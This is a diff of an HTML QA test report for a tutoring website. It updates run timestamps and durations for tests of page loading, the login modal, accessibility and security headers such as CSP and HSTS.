+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.08s</span>
         
         
       </div>
@@ -6306,8 +6306,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa10_arabic_modal_opens</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.69s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 16.32s</span>
         
         
       </div>
@@ -6404,8 +6404,8 @@ E     - waiting for locator(&quot;[role=\&quot;dialog\&quot;], [aria-modal=\&quo
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa10_arabic_country_code_default_966</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.72s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 16.17s</span>
         
         
       </div>
@@ -6502,7 +6502,7 @@ E     - waiting for locator(&quot;[role=\&quot;dialog\&quot;], [aria-modal=\&quo
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_desktop</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -6592,7 +6592,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_desktop</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -6682,7 +6682,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_desktop</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -6772,7 +6772,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_desktop</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -6862,7 +6862,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_desktop</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -6952,7 +6952,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_mobile</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -7042,7 +7042,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_mobile</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -7132,7 +7132,7 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa11_visual_regression_mobile</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -7222,8 +7222,8 @@ E   ModuleNotFoundError: No module named 'tests._visual_diff'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa12_no_uncaught_js_errors</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 4.93s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.83s</span>
         
         
       </div>
@@ -7314,8 +7314,8 @@ E     [console.error] Failed to load resource: the server responded with a statu
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa12_no_uncaught_js_errors</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 4.91s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.88s</span>
         
         
       </div>
@@ -7406,8 +7406,8 @@ E     [console.error] Failed to load resource: the server responded with a statu
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa12_no_uncaught_js_errors</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 4.95s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.86s</span>
         
         
       </div>
@@ -7498,8 +7498,8 @@ E     [console.error] Failed to load resource: the server responded with a statu
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa12_no_uncaught_js_errors</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 4.93s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.82s</span>
         
         
       </div>
@@ -7590,8 +7590,8 @@ E     [console.error] Failed to load resource: the server responded with a statu
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa13_strict_transport_security_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 0.73s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 0.70s</span>
         
         
       </div>
@@ -7682,8 +7682,8 @@ E   assert ''</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa13_x_frame_options_or_csp_frame_ancestors</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 0.71s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 0.66s</span>
         
         
       </div>
@@ -7775,7 +7775,7 @@ E   assert (False or False)</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa13_x_content_type_options_nosniff</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.66s</span>
         
         
@@ -7869,8 +7869,8 @@ E     - nosniff</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa13_referrer_policy_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 0.65s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 0.71s</span>
         
         
       </div>
@@ -7961,8 +7961,8 @@ E   assert ''</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa13_content_security_policy_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 0.69s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 0.64s</span>
         
         
       </div>
@@ -8051,8 +8051,8 @@ E   Failed: No Content-Security-Policy (nor CSP-Report-Only) header — XSS payl
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa13_no_server_version_disclosure</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 0.67s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 0.66s</span>
         
         
       </div>
@@ -8144,8 +8144,8 @@ E   assert not ['Server: nginx/1.24.0 (Ubuntu)', 'X-Powered-By: Next.js']</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa19_autonomous_exploration</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 81.01s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 80.81s</span>
         
         
       </div>
@@ -8238,8 +8238,8 @@ E   IndexError: list index out of range</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa19_autonomous_exploration</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 81.00s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 80.82s</span>
         
         
       </div>
@@ -8332,8 +8332,8 @@ E   IndexError: list index out of range</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa19_autonomous_exploration</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 81.01s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 80.81s</span>
         
         
       </div>
@@ -8565,10 +8565,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_homepage_loads_correct_url</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.04s</span>
+    <span class="trow-dur">2.41s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must load at the Mehad /en URL without redirect loop.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.04s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_homepage_loads_correct_url</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must load at the Mehad /en URL without redirect loop.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.41s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_homepage_loads_correct_url</code></span></div>
   </div>
 </details>
 
@@ -8577,10 +8577,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_header_login_button_present</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.49s</span>
+    <span class="trow-dur">3.80s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Log In button must be visible in the header (unauthenticated state).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.49s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_header_login_button_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Log In button must be visible in the header (unauthenticated state).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.80s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_header_login_button_present</code></span></div>
   </div>
 </details>
 
@@ -8589,10 +8589,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_modal_has_phone_input</span>
     
-    <span class="trow-dur">15.59s</span>
+    <span class="trow-dur">15.87s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Login modal must have a telephone input field.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.59s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_modal_has_phone_input</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Login modal must have a telephone input field.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.87s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_modal_has_phone_input</code></span></div>
   </div>
 </details>
 
@@ -8601,10 +8601,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_phone_field_accepts_numbers</span>
     <span class="trow-params">fill(&quot;98976564&quot;)</span>
-    <span class="trow-dur">15.56s</span>
+    <span class="trow-dur">15.84s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Phone input must accept digit input.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">fill(&quot;98976564&quot;)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.56s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_phone_field_accepts_numbers</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Phone input must accept digit input.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">fill(&quot;98976564&quot;)</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">15.84s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_phone_field_accepts_numbers</code></span></div>
   </div>
 </details>
 
@@ -8613,10 +8613,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_subject_badge_navigates_to_find_tutors</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.01s</span>
+    <span class="trow-dur">2.31s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Clicking a subject badge (e.g. Math) must navigate to /en/find-tutors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_subject_badge_navigates_to_find_tutors</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Clicking a subject badge (e.g. Math) must navigate to /en/find-tutors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.31s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_subject_badge_navigates_to_find_tutors</code></span></div>
   </div>
 </details>
 
@@ -8625,10 +8625,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_arabic_locale_page_loads</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">1.97s</span>
+    <span class="trow-dur">2.26s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Navigating to /ar must load the Arabic locale without errors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.97s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_arabic_locale_page_loads</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Navigating to /ar must load the Arabic locale without errors.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.26s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_arabic_locale_page_loads</code></span></div>
   </div>
 </details>
 
@@ -8637,10 +8637,10 @@ E   IndexError: list index out of range</pre>
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa01_footer_privacy_policy_link_works</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.01s</span>
+    <span class="trow-dur">2.30s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Footer Privacy Policy link must navigate to the policy page.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_footer_privacy_policy_link_works</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Footer Privacy Policy link must navigate to the policy page.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.30s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa01_footer_privacy_policy_link_works</code></span></div>
   </div>
 </details>
 
@@ -9171,10 +9171,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_all_requests_use_https</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.51s</span>
+    <span class="trow-dur">2.80s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Every outbound request on the homepage must use HTTPS.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.51s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_all_requests_use_https</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Every outbound request on the homepage must use HTTPS.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.80s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_all_requests_use_https</code></span></div>
   </div>
 </details>
 
@@ -9183,10 +9183,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_homepage_returns_2xx</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.03s</span>
+    <span class="trow-dur">1.89s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage initial response must be 2xx.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.03s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_homepage_returns_2xx</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage initial response must be 2xx.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.89s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_homepage_returns_2xx</code></span></div>
   </div>
 </details>
 
@@ -9195,10 +9195,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_no_5xx_responses_during_load</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.05s</span>
+    <span class="trow-dur">1.88s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">No network response must be 5xx on full homepage load.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.05s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_no_5xx_responses_during_load</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">No network response must be 5xx on full homepage load.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.88s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_no_5xx_responses_during_load</code></span></div>
   </div>
 </details>
 
@@ -9207,10 +9207,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_content_type_header_present</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.01s</span>
+    <span class="trow-dur">1.88s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage HTML response must include Content-Type header.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_content_type_header_present</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage HTML response must include Content-Type header.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.88s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_content_type_header_present</code></span></div>
   </div>
 </details>
 
@@ -9219,10 +9219,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_api_calls_on_load_are_reasonable</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.08s</span>
+    <span class="trow-dur">2.88s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must not make an excessive number of API calls (&gt; 50) on load.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.08s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_api_calls_on_load_are_reasonable</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Homepage must not make an excessive number of API calls (&gt; 50) on load.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.88s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_api_calls_on_load_are_reasonable</code></span></div>
   </div>
 </details>
 
@@ -9231,10 +9231,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_find_tutors_api_returns_data</span>
     
-    <span class="trow-dur">3.54s</span>
+    <span class="trow-dur">3.42s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Find-tutors page must issue at least one API/data fetch request.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_find_tutors_api_returns_data</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Find-tutors page must issue at least one API/data fetch request.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.42s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_find_tutors_api_returns_data</code></span></div>
   </div>
 </details>
 
@@ -9243,10 +9243,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_no_auth_tokens_in_url_params</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.01s</span>
+    <span class="trow-dur">1.88s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Auth tokens must never appear in URL query parameters.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_no_auth_tokens_in_url_params</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Auth tokens must never appear in URL query parameters.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.88s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_no_auth_tokens_in_url_params</code></span></div>
   </div>
 </details>
 
@@ -9255,10 +9255,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_csp_header_present_or_meta</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">2.03s</span>
+    <span class="trow-dur">1.91s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Content-Security-Policy should be set (header or meta tag).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.03s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_csp_header_present_or_meta</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Content-Security-Policy should be set (header or meta tag).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">1.91s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_csp_header_present_or_meta</code></span></div>
   </div>
 </details>
 
@@ -9267,10 +9267,10 @@ Call log:
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa06_find_tutors_no_cors_error</span>
     
-    <span class="trow-dur">2.81s</span>
+    <span class="trow-dur">2.66s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Find-tutors page must not log CORS errors in the console.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.81s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_find_tutors_no_cors_error</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Find-tutors page must not log CORS errors in the console.</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.66s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa06_find_tutors_no_cors_error</code></span></div>
   </div>
 </details>
 
@@ -9318,10 +9318,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa07_images_have_alt_text</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.01s</span>
+    <span class="trow-dur">2.87s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Meaningful images must have non-empty alt text.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.01s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_images_have_alt_text</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Meaningful images must have non-empty alt text.</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">2.87s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_images_have_alt_text</code></span></div>
   </div>
 </details>
 
@@ -9330,10 +9330,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
     <span class="trow-name">test_qa07_login_button_keyboard_accessible</span>
     <span class="trow-params">BASE_URL</span>
-    <span class="trow-dur">3.54s</span>
+    <span class="trow-dur">3.45s</span>
   </summary>
   <div class="trow-details">
-    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Log In button must be reachable and activatable via keyboard (Tab + Enter).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.54s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_login_button_keyboard_accessible</code></span></div>
+    <div class="td-row"><span class="td-lbl">What this test checks:</span><span class="td-val">Log In button must be reachable and activatable via keyboard (Tab + Enter).</span></div><div class="td-row"><span class="td-lbl">Test data used:</span><span class="td-val td-data">BASE_URL</span></div><div class="td-row"><span class="td-lbl">Duration:</span><span class="td-val">3.45s</span></div><div class="td-row"><span class="td-lbl">Test function:</span><span class="td-val"><code>test_qa07_login_button_keyboard_accessible</code></span></div>
   </div>
 </details>
 
@@ -9342,10 +9342,10 @@ and truncated responses.</span></div><div class="td-row"><span class="td-lbl">Te
     <span class="t-chip pass">✅ PASSED</span>
